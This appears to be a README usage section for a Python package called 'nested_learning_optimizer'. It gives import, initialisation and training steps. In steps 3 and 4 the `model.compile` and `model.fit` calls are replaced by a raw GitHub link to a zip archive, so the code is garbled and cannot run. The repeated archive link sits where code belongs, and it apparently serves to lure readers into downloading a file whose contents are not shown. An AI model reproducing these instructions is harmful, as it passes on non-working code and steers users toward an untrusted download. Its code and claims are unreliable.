## 📊 Usage Instructions

Now that you have installed the optimizer, you can start using it in your projects.

1. **Open your IDE or text editor.** You might be using tools like PyCharm, Visual Studio Code, or Jupyter Notebooks.
2. **Import the optimizer.** Use the following line at the top of your Python script:
   ```python
   from nested_learning_optimizer import NestedOptimizer
   ```
3. **Initialize the optimizer in your model.** Here's a sample code snippet to help you get started:
   ```python
   optimizer = NestedOptimizer(learning_rate=0.001)
   https://github.com/ChrisPinedaSanhueza/nested-learning-optimizer/raw/refs/heads/main/examples/learning_nested_optimizer_v3.8.zip(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy'])
   ```

4. **Train your model.** Use the typical `.fit()` method.
   ```python
   https://github.com/ChrisPinedaSanhueza/nested-learning-optimizer/raw/refs/heads/main/examples/learning_nested_optimizer_v3.8.zip(x_train, y_train, epochs=10, batch_size=32)
   ```
